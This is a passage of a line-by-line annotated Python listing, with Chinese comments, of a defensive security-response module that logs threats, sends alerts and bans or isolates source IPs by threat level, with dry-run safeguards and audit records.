| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            msg = result` |
| 115 | 条件判断：满足条件时进入对应分支。 | `            if extra:` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                msg = f"{result}\|{extra!r}"` |
| 117 | 日志记录：输出运行状态、调试信息或异常线索。 | `            self._security_logger.log_response(action, target, msg[:2000])` |
| 118 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 119 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[响应] 审计日志写入失败: %s", exc)` |
| 120 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 121 | 函数定义：声明 `respond` 的输入、处理逻辑和返回结果。 | `    def respond(self, result: DetectionResult) -> None:` |
| 122 | 条件判断：满足条件时进入对应分支。 | `        if result.threat_type == "normal":` |
| 123 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 124 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level = (result.threat_level or "").lower()` |
| 126 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning(` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "[响应] %s - %s (置信度: %s)",` |
| 128 | 函数调用：执行已有函数/方法完成当前步骤。 | `            level.upper(),` |
| 129 | 代码语句：参与当前文件的业务流程或数据处理。 | `            result.details,` |
| 130 | 代码语句：参与当前文件的业务流程或数据处理。 | `            result.confidence,` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 132 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 133 | 条件判断：满足条件时进入对应分支。 | `        if level == "low":` |
| 134 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._log_only(result)` |
| 135 | 条件分支：前面条件不满足时继续判断。 | `        elif level == "medium":` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._log_only(result)` |
| 137 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._notify(result, subject_prefix="[MEDIUM]")` |
| 138 | 条件分支：前面条件不满足时继续判断。 | `        elif level == "high":` |
| 139 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._log_only(result)` |
| 140 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._notify(result, subject_prefix="[HIGH]")` |
| 141 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._ban_for_level(result, duration=_HIGH_BAN_DURATION, level_label="high")` |
| 142 | 条件分支：前面条件不满足时继续判断。 | `        elif level == "critical":` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._log_only(result)` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._notify(result, subject_prefix="[CRITICAL]")` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._ban_for_level(result, duration=_CRITICAL_BAN_DURATION, level_label="critical")` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._isolate_for_critical(result)` |
| 147 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 148 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[响应] 未知威胁等级: %r，按 low 处理", level)` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._log_only(result)` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 函数定义：声明 `_log_only` 的输入、处理逻辑和返回结果。 | `    def _log_only(self, result: DetectionResult) -> None:` |
| 152 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 153 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[安全事件] type=%s level=%s ip=%s confidence=%s detail=%s",` |
| 154 | 代码语句：参与当前文件的业务流程或数据处理。 | `            result.threat_type,` |
| 155 | 代码语句：参与当前文件的业务流程或数据处理。 | `            result.threat_level,` |
| 156 | 代码语句：参与当前文件的业务流程或数据处理。 | `            result.source_ip,` |
| 157 | 代码语句：参与当前文件的业务流程或数据处理。 | `            result.confidence,` |
| 158 | 代码语句：参与当前文件的业务流程或数据处理。 | `            result.details,` |
| 159 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 160 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 161 | 函数定义：声明 `_notify` 的输入、处理逻辑和返回结果。 | `    def _notify(self, result: DetectionResult, *, subject_prefix: str) -> None:` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        subject = f"{subject_prefix} {result.threat_type} / {result.threat_level}"` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body = (` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"threat_type={result.threat_type}\n"` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"level={result.threat_level}\n"` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"source_ip={result.source_ip}\n"` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"confidence={result.confidence}\n"` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"details={result.details}\n"` |
| 169 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta = {` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "threat_type": result.threat_type,` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "threat_level": result.threat_level,` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "confidence": float(result.confidence),` |
| 174 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        attempts = self._notifier.notify_all(subject, body, meta=meta)` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        aid = self._alert_id(result)` |
| 177 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        any_ok = any(a.ok for a in attempts)` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry = self.dry_run` |
| 179 | 条件判断：满足条件时进入对应分支。 | `        if any_ok:` |
| 180 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._append_memory_action(` |
| 181 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "action": "notify",` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "source_ip": result.source_ip,` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "dry_run": dry,` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "status": "applied",` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "channels": [a.channel for a in attempts if a.ok],` |
| 187 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pid = self._persist_action(` |
| 190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=aid,` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                action_type="notify",` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                target=result.source_ip,` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="applied",` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                dry_run=dry,` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta={"attempts": [{"c": x.channel, "ok": x.ok, "d": x.detail} for x in attempts]},` |
| 196 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            _ = pid` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._audit("notify", result.source_ip or "", "ok", extra={"attempts": len(attempts)})` |
| 199 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 200 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._append_memory_action(` |
| 201 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "action": "notify",` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "source_ip": result.source_ip,` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "dry_run": dry,` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "status": "failed",` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "channels": [` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        {"channel": a.channel, "ok": a.ok, "detail": a.detail} for a in attempts` |
| 208 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    ],` |
| 209 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 210 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 211 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persist_action(` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=aid,` |
| 213 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                action_type="notify",` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                target=result.source_ip,` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="failed",` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                dry_run=dry,` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                error=";".join(f"{a.channel}:{a.detail}" for a in attempts[-3:]),` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta={"attempts": [{"c": x.channel, "ok": x.ok, "d": x.detail} for x in attempts]},` |
| 219 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 220 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._audit(` |
| 221 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "notify",` |
| 222 | 代码语句：参与当前文件的业务流程或数据处理。 | `                result.source_ip or "",` |
| 223 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "failed",` |
| 224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                extra={"last": attempts[-1].detail if attempts else ""},` |
| 225 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 226 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persistence.append_audit_db_event(` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                event_type="notify_failed",` |
| 228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                resource_id=aid,` |
| 229 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                payload={"detail": [a.detail for a in attempts]},` |
| 230 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 231 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._scheduler.schedule_notify_retry(` |
| 232 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                run_at=datetime.now(timezone.utc) + timedelta(seconds=15),` |
| 233 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=aid,` |
| 234 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                subject=subject,` |
| 235 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                body=body,` |
| 236 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta=meta,` |
| 237 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 238 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 239 | 函数定义：声明 `_ban_for_level` 的输入、处理逻辑和返回结果。 | `    def _ban_for_level(` |
| 240 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result: DetectionResult,` |
| 242 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        duration: timedelta,` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level_label: str,` |
| 245 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 246 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = result.source_ip if isinstance(result.source_ip, str) else ""` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        aid = self._alert_id(result)` |
| 248 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            skip_reason = (` |
| 250 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "missing_source_ip"` |
| 251 | 条件判断：满足条件时进入对应分支。 | `                if not (isinstance(ip, str) and ip.strip())` |
| 252 | 兜底分支：处理前面条件都不满足的情况。 | `                else "invalid_ipv4_format"` |
| 253 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 254 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning(` |
| 255 | 函数调用：执行已有函数/方法完成当前步骤。 | `                "[响应][降级] 无法自动封禁：%s (%r)。",` |
| 256 | 代码语句：参与当前文件的业务流程或数据处理。 | `                skip_reason,` |
| 257 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ip,` |
| 258 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 259 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._append_memory_action(` |
| 260 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "action": "ban_ip",` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "source_ip": ip.strip() if isinstance(ip, str) else "",` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "dry_run": self.dry_run,` |
| 264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "status": "skipped",` |
| 265 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "reason": skip_reason,` |
| 266 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 267 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 268 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persist_action(` |
| 269 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=aid,` |
| 270 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                action_type="ban_ip",` |
| 271 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                target=ip,` |
| 272 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="skipped",` |
| 273 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                dry_run=self.dry_run,` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                error=skip_reason,` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta={"level": level_label},` |
| 276 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 277 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._audit("ban_ip", ip, f"skipped:{skip_reason}")` |
| 278 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 279 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 280 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = ip.strip()` |
| 281 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        eligibility = check_real_ban_eligibility(ip)` |
| 282 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        effective_firewall_dry = self.dry_run` |
| 283 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ban_status = "applied"` |
| 284 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        policy_note = ""` |
| 285 | 条件判断：满足条件时进入对应分支。 | `        if self.dry_run:` |
| 286 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            effective_firewall_dry = True` |
| 287 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ban_status = "dry_run_simulated"` |
| 288 | 条件分支：前面条件不满足时继续判断。 | `        elif not eligibility.allowed:` |
| 289 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            effective_firewall_dry = True` |
| 290 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ban_status = "dry_run_simulated"` |
| 291 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            policy_note = eligibility.rejection_reason` |
| 292 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 293 | 条件判断：满足条件时进入对应分支。 | `        if ip in self._banned_ips:` |
| 294 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[防火墙] IP 已在封禁列表中，跳过: %s", ip)` |
| 295 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._append_memory_action(` |
| 296 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 297 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "action": "ban_ip",` |
| 298 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "source_ip": ip,` |
| 299 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "dry_run": self.dry_run,` |
| 300 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "status": "skipped",` |
| 301 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "reason": "already_banned",` |
| 302 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 303 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 304 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persist_action(` |
| 305 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=aid,` |
| 306 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                action_type="ban_ip",` |
| 307 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                target=ip,` |
| 308 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="skipped",` |
| 309 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                dry_run=self.dry_run,` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta={"level": level_label},` |
| 311 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 312 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 313 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 314 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fw_res = self._firewall.ban_input_drop(ip, dry_run=effective_firewall_dry)` |
| 315 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        until = datetime.now(timezone.utc) + duration` |
| 316 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 317 | 条件判断：满足条件时进入对应分支。 | `        if not fw_res.ok:` |
| 318 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[防火墙] 封禁失败: %s", fw_res.message)` |
| 319 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._append_memory_action(` |
| 320 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 321 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "action": "ban_ip",` |
| 322 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "source_ip": ip,` |
| 323 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "dry_run": effective_firewall_dry,` |
| 324 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "status": "failed",` |
| 325 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "reason": fw_res.message,` |
| 326 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 327 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 328 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persist_action(` |
| 329 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=aid,` |
| 330 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                action_type="ban_ip",` |
| 331 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                target=ip,` |
| 332 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="failed",` |
| 333 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                dry_run=effective_firewall_dry,` |
| 334 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                error=fw_res.message,` |
| 335 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                scheduled_unblock_at=until,` |
| 336 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta={"level": level_label, "command": fw_res.command},` |
| 337 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 338 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._audit("ban_ip", ip, f"failed:{fw_res.message}")` |
| 339 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 340 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 341 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._banned_ips[ip] = until` |
| 342 | 条件判断：满足条件时进入对应分支。 | `        if effective_firewall_dry:` |
| 343 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info(` |
| 344 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[DRY RUN] 封禁为演练/降级模拟，非生产iptables成功: ip=%s msg=%s",` |
| 345 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ip,` |
| 346 | 代码语句：参与当前文件的业务流程或数据处理。 | `                fw_res.message,` |
| 347 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 348 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 349 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._append_memory_action(` |
| 350 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 351 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "action": "ban_ip",` |
| 352 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source_ip": ip,` |
| 353 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "dry_run": effective_firewall_dry,` |
| 354 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": ban_status,` |
| 355 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "duration_sec": int(duration.total_seconds()),` |
| 356 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "iptables_cmd": fw_res.command,` |
| 357 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "policy_note": policy_note,` |
| 358 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 359 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 360 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rid = self._persist_action(` |
| 361 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=aid,` |
| 362 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            action_type="ban_ip",` |
| 363 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            target=ip,` |
| 364 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status=ban_status,` |
| 365 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dry_run=effective_firewall_dry,` |
| 366 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            scheduled_unblock_at=until,` |
| 367 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            meta={` |
| 368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "level": level_label,` |
| 369 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "command": fw_res.command,` |
| 370 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "simulated_reason": policy_note or None,` |
| 371 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 372 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 373 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._audit(` |
| 374 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "ban_ip",` |
| 375 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ip,` |
| 376 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "DRY_RUN_SIMULATED" if ban_status == "dry_run_simulated" else "applied",` |
| 377 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            extra={"dry_run": effective_firewall_dry, "status": ban_status},` |
| 378 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 379 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 380 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._scheduler.schedule_unblock(` |
| 381 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ip=ip,` |
| 382 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            run_at=until if until.tzinfo else until.replace(tzinfo=timezone.utc),` |
| 383 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dry_run=effective_firewall_dry,` |
| 384 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=aid,` |
| 385 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            related_response_action_id=rid or None,` |
| 386 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 387 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 388 | 函数定义：声明 `_isolate_for_critical` 的输入、处理逻辑和返回结果。 | `    def _isolate_for_critical(self, result: DetectionResult) -> None:` |
| 389 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = result.source_ip if isinstance(result.source_ip, str) else ""` |
| 390 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        aid = self._alert_id(result)` |
| 391 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 392 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[响应][降级] 隔离跳过：非法 IP %r", ip)` |
| 393 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 394 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = ip.strip()` |
| 395 | 条件判断：满足条件时进入对应分支。 | `        if isinstance(self._isolation, NullHostIsolationProvider):` |
| 396 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._append_memory_action(` |
| 397 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 398 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "action": "isolation_manual_pending",` |
| 399 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "source_ip": ip,` |
| 400 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "dry_run": self.dry_run,` |
| 401 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "status": "pending",` |
| 402 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "reason": "host_isolation_provider_unconfigured",` |
| 403 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 404 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 405 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persist_action(` |
| 406 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_id=aid,` |
| 407 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                action_type="isolation_manual_pending",` |
| 408 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                target=ip,` |
| 409 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="pending",` |
| 410 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                dry_run=self.dry_run,` |
| 411 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta={"reason": "host_isolation_provider_unconfigured"},` |
| 412 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 413 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._audit(` |
| 414 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "isolate_host",` |
| 415 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ip,` |
| 416 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "manual_todo:provider_unconfigured",` |
| 417 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 418 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persistence.append_audit_db_event(` |
| 419 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                event_type="isolation_manual_pending",` |
| 420 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                resource_id=aid,` |
| 421 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                payload={"ip": ip},` |
| 422 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 423 | 返回结果：把处理后的值交回调用方。 | `            return` |
